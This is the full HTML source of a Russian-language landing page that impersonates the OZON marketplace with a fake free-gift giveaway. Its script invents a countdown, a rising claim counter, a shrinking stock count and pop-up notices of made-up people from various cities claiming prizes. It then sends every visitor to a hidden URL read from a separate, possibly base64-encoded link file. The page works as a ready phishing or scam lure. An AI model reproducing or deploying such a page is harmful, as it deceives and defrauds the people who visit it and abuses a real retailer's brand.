<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Забери подарки прямо сейчас</title>
<meta name="description" content="OZON дарит подарки — забери свой!">
<meta property="og:title" content="Забери подарки прямо сейчас">
<meta property="og:description" content="OZON дарит подарки — забери свой!">
<meta property="og:image" content="https://www.google.com/imgres?q=%D0%B3%D0%BE%D1%80%D0%BE%D0%B4%20%D0%BA%D1%80%D0%B0%D1%81%D0%BD%D0%BE%D0%B4%D0%B0%D1%80&imgurl=https%3A%2F%2Fimg.championat.com%2Fnews%2Fbig%2Fj%2Fj%2Fden-goroda-krasnodara-2025-programma-meropriyatij_17585484611855106433.jpg&imgrefurl=https%3A%2F%2Fwww.championat.com%2Flifestyle%2Farticle-5722526-den-goroda-krasnodara-2024-kakogo-chisla-data-programma-meropriyatij-afisha-koncerty-salyut.html&docid=kz0QQnx26BEWGM&tbnid=XJBnX3yronHkFM&vet=12ahUKEwiz2viojI6XAxX3PxAIHd4YGY4QnPAOegQIWhAA..i&w=1350&h=900&hcb=2&ved=2ahUKEwiz2viojI6XAxX3PxAIHd4YGY4QnPAOegQIWhAA">
<meta property="og:url" content="https://gorod1.github.io/_/">
<meta property="og:type" content="website">
<meta property="og:site_name" content="OZON Подарки">
<style>
:root { --blue:#005BFF; --pink:#F91155; --text:#1a1a1a; --muted:#666; }
* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
body {
    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    min-height:100vh; min-height:100dvh;
    background:var(--pink);
    display:flex; align-items:center; justify-content:center;
    position:relative; overflow:hidden;
    padding:110px 16px 32px; color:var(--text);
}
body::before {
    content:''; position:fixed; inset:0;
    background-color:var(--pink);
    background-image:
        radial-gradient(ellipse 80% 50% at 20% 30%, var(--blue) 0%, transparent 50%),
        radial-gradient(ellipse 70% 60% at 80% 60%, var(--blue) 0%, transparent 55%),
        radial-gradient(ellipse 60% 40% at 40% 80%, var(--blue) 0%, transparent 50%),
        radial-gradient(ellipse 90% 50% at 90% 20%, var(--blue) 0%, transparent 45%),
        radial-gradient(ellipse 50% 70% at 10% 70%, var(--blue) 0%, transparent 50%);
    animation:waveShift 12s ease-in-out infinite;
    z-index:0; pointer-events:none;
}
@keyframes waveShift { 0%,100% { transform:scale(1) rotate(0); } 50% { transform:scale(1.05) rotate(2deg); } }
.logo {
    position:fixed; top:20px; left:50%; transform:translateX(-50%);
    font-size:42px; font-weight:900; color:#fff; letter-spacing:2px;
    z-index:10; font-family:'Arial Black', sans-serif;
    text-shadow:0 4px 20px rgba(0,0,0,.15);
    animation:logoPulse 3s ease-in-out infinite;
}
@keyframes logoPulse { 0%,100% { transform:translateX(-50%) scale(1); } 50% { transform:translateX(-50%) scale(1.05); } }
.deal-timer {
    position:fixed; top:75px; left:50%; transform:translateX(-50%);
    background:rgba(255,255,255,.95); color:var(--pink);
    padding:8px 18px; border-radius:20px;
    font-size:13px; font-weight:700; z-index:10;
    box-shadow:0 4px 15px rgba(0,0,0,.15); white-space:nowrap;
}
.deal-timer time { font-family:'Courier New', monospace; font-size:15px; }
.card {
    background:#fff; border-radius:20px; padding:30px 25px;
    text-align:center; box-shadow:0 20px 60px rgba(0,0,0,.3);
    max-width:340px; width:88%; z-index:10; position:relative;
    animation:cardIn .6s ease-out; margin-top:40px;
}
@keyframes cardIn { from { transform:scale(.8) translateY(30px); opacity:0; } to { transform:scale(1) translateY(0); opacity:1; } }
.gift-icon {
    width:90px; height:90px; margin:0 auto 15px;
    background:linear-gradient(135deg, var(--blue), var(--pink));
    border-radius:50%; display:flex; align-items:center; justify-content:center;
    font-size:50px; animation:giftBounce 1.5s ease-in-out infinite;
    box-shadow:0 10px 30px rgba(0,91,255,.3); transition:transform .3s;
}
.gift-icon.opened { animation:openGift .6s ease-out forwards; }
@keyframes openGift {
    0% { transform:scale(1) rotate(0); }
    30% { transform:scale(1.3) rotate(-15deg); }
    60% { transform:scale(1.2) rotate(15deg); }
    100% { transform:scale(0) rotate(360deg); opacity:0; }
}
@keyframes giftBounce { 0%,100% { transform:translateY(0) rotate(-5deg); } 50% { transform:translateY(-10px) rotate(5deg); } }
.card h1 { color:var(--text); font-size:22px; font-weight:800; margin-bottom:10px; line-height:1.3; }
.card p { color:var(--muted); font-size:14px; margin-bottom:15px; line-height:1.5; }
.claimed {
    display:inline-block; background:#F0F8FF; color:var(--blue);
    font-size:12px; font-weight:700; padding:6px 14px;
    border-radius:12px; margin-bottom:15px;
}
.claimed b { color:var(--pink); font-size:15px; }
.price { display:flex; align-items:center; justify-content:center; gap:12px; margin-bottom:10px; }
.price-old { color:#999; font-size:18px; text-decoration:line-through; }
.price-new { color:var(--pink); font-size:32px; font-weight:900; animation:pricePulse 1.5s ease-in-out infinite; }
@keyframes pricePulse { 0%,100% { transform:scale(1); } 50% { transform:scale(1.1); } }
.stock-left { color:var(--pink); font-size:12px; font-weight:700; margin-bottom:18px; }
.btn {
    background:var(--blue); color:#fff; border:none; border-radius:12px;
    padding:16px 24px; font-size:16px; font-weight:700; width:100%;
    cursor:pointer; animation:btnPulse 1.5s ease-in-out infinite;
    box-shadow:0 8px 20px rgba(0,91,255,.35); font-family:inherit; transition:transform .2s;
}
.btn:active { transform:scale(.97); }
@keyframes btnPulse {
    0%,100% { transform:scale(1); box-shadow:0 8px 20px rgba(0,91,255,.35); }
    50% { transform:scale(1.03); box-shadow:0 12px 28px rgba(0,91,255,.5); }
}
.progress { background:#eee; border-radius:10px; height:8px; overflow:hidden; margin:20px 0 10px; }
.progress-bar { background:linear-gradient(90deg, var(--blue), var(--pink)); height:100%; width:0; transition:width .1s linear; border-radius:10px; }
.timer { color:#888; font-size:13px; font-weight:500; }
.confetti { position:fixed; top:-20px; width:10px; height:10px; animation:fall linear infinite; z-index:5; border-radius:2px; pointer-events:none; }
@keyframes fall { to { transform:translateY(105vh) rotate(720deg); } }
.notifications { position:fixed; bottom:15px; left:15px; z-index:20; max-width:280px; pointer-events:none; }
.notif {
    background:#fff; border-radius:12px; padding:10px 14px; margin-top:8px;
    box-shadow:0 6px 20px rgba(0,0,0,.2); display:flex; align-items:center; gap:10px;
    animation:notifIn .4s ease-out; border-left:3px solid var(--blue);
}
.notif.out { animation:notifOut .4s ease-in forwards; }
.notif-avatar {
    width:32px; height:32px; background:linear-gradient(135deg, var(--blue), var(--pink));
    border-radius:50%; display:flex; align-items:center; justify-content:center;
    color:#fff; font-weight:700; font-size:14px; flex-shrink:0;
}
.notif-text { font-size:11px; color:#333; line-height:1.3; }
.notif-text b { color:var(--text); }
.notif-text small { color:#999; font-size:10px; }
@keyframes notifIn { from { transform:translateX(-120%); opacity:0; } to { transform:translateX(0); opacity:1; } }
@keyframes notifOut { to { transform:translateX(-120%); opacity:0; } }
@media (max-width:360px) {
    .logo { font-size:32px; }
    .deal-timer { font-size:11px; padding:6px 14px; top:65px; }
    .card { padding:25px 18px; }
    .card h1 { font-size:19px; }
    .price-new { font-size:26px; }
    .gift-icon { width:75px; height:75px; font-size:40px; }
}
</style>
</head>
<body>
<p class="logo" aria-hidden="true">OZON</p>
<p class="deal-timer" role="status">⏰ До конца акции: <time id="dealTimer">00:05:42</time></p>
<div class="confetti" style="left:8%;background:#F91155;animation-duration:4.5s;"></div>
<div class="confetti" style="left:22%;background:#005BFF;animation-duration:5.2s;animation-delay:.4s;"></div>
<div class="confetti" style="left:38%;background:#F91155;animation-duration:3.9s;animation-delay:.8s;"></div>
<div class="confetti" style="left:52%;background:#005BFF;animation-duration:4.8s;animation-delay:.2s;"></div>
<div class="confetti" style="left:68%;background:#F91155;animation-duration:5.5s;animation-delay:.6s;"></div>
 <div class="confetti" style="left:82%;background:#005BFF;animation-duration:4.2s;animation-delay:1s;"></div>
<div class="confetti" style="left:94%;background:#F91155;animation-duration:5s;animation-delay:.3s;"></div>
<main class="card">
    <div class="gift-icon" id="gift" aria-hidden="true">🎁</div>
    <h1>Забери подарки прямо сейчас</h1>
    <p>OZON дарит подарки!<br>Успей забрать свой.</p>
    <p class="claimed">Уже забрали: <b id="claimCount">2 347</b> человек</p>
    <div class="price">
        <span class="price-old">999 ₽</span>
        <span class="price-new">0 ₽</span>
    </div>
    <p class="stock-left" id="stockLeft">Осталось 47 подарков</p>
    <button class="btn" id="btn" type="button">Забрать подарок</button>
    <div class="progress"><div class="progress-bar" id="bar"></div></div>
    <p class="timer" id="timer">Переход через 6 секунд...</p>
</main>
<div class="notifications" id="notifications" aria-hidden="true"></div>
<script>
(function () {
    'use strict';
    var LINK_FILE = 'link.txt';
    var DELAY = 6000;
    var btn = document.getElementById('btn');
    var giftEl = document.getElementById('gift');
    var timerEl = document.getElementById('timer');
    var bar = document.getElementById('bar');
    var dealEl = document.getElementById('dealTimer');
    var claimEl = document.getElementById('claimCount');
    var stockEl = document.getElementById('stockLeft');
    var notifContainer = document.getElementById('notifications');
    var prefersReducedMotion = typeof window.matchMedia === 'function' &&
        window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    function parseLink(raw) {
        if (!raw) return null;
        var line = raw.trim().split('\n')[0].trim();
        if (!line) return null;
        if (/^https?:\/\//i.test(line)) return line;
        try {
            var dec = atob(line);
            if (/^https?:\/\//i.test(dec)) return dec;
        } catch (e) {}
        return null;
    }
    var REDIRECT_URL = null;
    function loadRedirectUrl() {
        return fetch(LINK_FILE + '?t=' + Date.now(), { cache: 'no-store' })
            .then(function (r) { return r.ok ? r.text() : Promise.reject('HTTP ' + r.status); })
            .then(function (txt) {
                var url = parseLink(txt);
                if (url) REDIRECT_URL = url;
            })
            .catch(function () {});
    }
    var claimCount = 2347;
    setInterval(function () {
        claimCount += Math.floor(Math.random() * 3) + 1;
        claimEl.textContent = claimCount.toLocaleString('ru-RU');
    }, 2500);
    var stockLeft = 47;
    setInterval(function () {
        if (stockLeft > 3) {
            stockLeft -= Math.floor(Math.random() * 2) + 1;
            if (stockLeft < 3) stockLeft = 3;
            stockEl.textContent = 'Осталось ' + stockLeft + ' подарков';
        }
    }, 4000);
    var dealTime = 5 * 60 + 42;
    setInterval(function () {
        if (dealTime > 0) {
            dealTime--;
            var m = String(Math.floor(dealTime / 60)).padStart(2, '0');
            var s = String(dealTime % 60).padStart(2, '0');
            dealEl.textContent = m + ':' + s;
        }
    }, 1000);
    var maleNames = ['Дмитрий','Сергей','Алексей','Иван','Максим','Артём','Андрей','Никита','Владимир','Роман','Павел','Денис','Кирилл','Антон','Егор'];
    var femaleNames = ['Ольга','Анна','Мария','Екатерина','Наталья','Елена','Юлия','Татьяна','Светлана','Оксана','Ирина','Ксения','Алина','Виктория','Полина'];
    var cities = ['Москвы','Санкт-Петербурга','Казани','Новосибирска','Екатеринбурга','Краснодара','Нижнего Новгорода','Самары','Омска','Ростова-на-Дону','Уфы','Красноярска','Воронежа','Перми','Волгограда','Саратова','Тюмени','Тольятти','Ижевска','Барнаула'];
    var gifts = ['🎁 подарок','📱 смартфон','🎧 наушники','⌚ часы','💻 ноутбук','📷 камеру','🎮 приставку','📺 телевизор','🎵 колонку','⌨️ клавиатуру','🖱️ мышь','💡 умную лампу','🔋 пауэрбанк','🎤 микрофон','🖥️ монитор'];
 function showNotification() {
        if (prefersReducedMotion) return;
        var isMale = Math.random() < 0.5;
        var name = isMale
            ? maleNames[Math.floor(Math.random() * maleNames.length)]
            : femaleNames[Math.floor(Math.random() * femaleNames.length)];
        var action = isMale ? 'забрал' : 'забрала';
        var city = cities[Math.floor(Math.random() * cities.length)];
        var gift = gifts[Math.floor(Math.random() * gifts.length)];
        var timeAgo = Math.floor(Math.random() * 5) + 1;
        var notif = document.createElement('div');
        notif.className = 'notif';
        notif.innerHTML = '<div class="notif-avatar">' + name[0] + '</div><div class="notif-text"><b>' + name + '</b> из ' + city + '<br>' + action + ' ' + gift + '<br><small>' + timeAgo + ' мин. назад</small></div>';
        notifContainer.appendChild(notif);
        setTimeout(function () {
            notif.classList.add('out');
            setTimeout(function () { notif.remove(); }, 400);
        }, 3500);
    }
    setTimeout(showNotification, 2000);
    setInterval(showNotification, 5000);
    var timeLeft = DELAY / 1000;
    var redirected = false;
    var progressInterval = setInterval(function () {
        if (redirected) return;
        timeLeft -= 0.1;
        var progress = ((DELAY / 1000 - timeLeft) / (DELAY / 1000)) * 100;
        bar.style.width = Math.min(progress, 100) + '%';
        if (timeLeft <= 0) {
            clearInterval(progressInterval);
            timerEl.textContent = 'Переходим...';
        } else {
            timerEl.textContent = 'Переход через ' + Math.ceil(timeLeft) + ' сек...';
        }
    }, 100);
    function performRedirect() {
        if (redirected || !REDIRECT_URL) return;
        redirected = true;
        window.location.href = REDIRECT_URL;
    }
    function tryRedirect() {
        if (redirected) return;
        if (REDIRECT_URL) { performRedirect(); return; }
        var waited = 0;
        var waitId = setInterval(function () {
            waited += 100;
            if (REDIRECT_URL) {
                clearInterval(waitId);
                performRedirect();
            } else if (waited >= 3000) {
                clearInterval(waitId);
                timerEl.textContent = 'Не удалось загрузить ссылку.';
            }
        }, 100);
    }
    loadRedirectUrl();
    var redirectTimeout = setTimeout(tryRedirect, DELAY);
    btn.addEventListener('click', function () {
        if (redirected) return;
        clearTimeout(redirectTimeout);
        var navigate = function () {
            if (REDIRECT_URL) performRedirect();
            else loadRedirectUrl().then(function () {
                if (REDIRECT_URL) performRedirect();
                else timerEl.textContent = 'Ссылка временно недоступна.';
            });
        };
        if (prefersReducedMotion || !giftEl) { navigate(); return; }
        giftEl.classList.add('opened');
        setTimeout(navigate, 500);
    });
})();
</script>
</body>
</html>
